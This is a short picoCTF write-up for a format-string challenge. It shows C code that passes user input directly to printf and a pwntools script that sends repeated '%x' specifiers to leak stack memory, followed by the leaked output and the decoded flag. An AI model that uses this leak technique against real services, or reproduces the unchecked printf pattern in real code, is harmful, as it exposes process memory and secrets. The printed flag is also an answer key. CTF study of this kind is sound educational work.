```C
   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
```

So, on inputting 200 %x should suffice to print out the stack elements
```python
from pwn import *
s = remote("saturn.picoctf.net", 62708)
s.recv()
s.send(b"%x" * 200) # enough to fill the whole buffer
s.recvuntil(b"- \n")
leak = s.recv()
print(leak)
```
Here’s a script for that 

  [https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/stringzz.md](https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/stringzz.md)
Then copy paste the leak into cyberchef from hex and cut out senseless parts until flag is seen
On deleting till the last set of recurring numbers in cyberchef, from hex, we get

```bash
[+] Opening connection to saturn.picoctf.net on port 56480: Done
b'ffcd57f0ffcd58108049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578252578256f6369707b4654436b34334c5f676e3167346c466666305f3474535f395f6b63326539397d343238fbad20004790e000f7fa4990804c00080494100804c000ffcd58d880494182ffcd5984ffcd59900ffcd58f000f7d9aed5\n'
[*] Closed connection to saturn.picoctf.net port 56480
```

`ocip{FTCk43L_gn1g4lFff0_4tS_9_kc2e99}428`
We get this, flipping every 4 characters we get the flag

**FLAG - `picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}`**
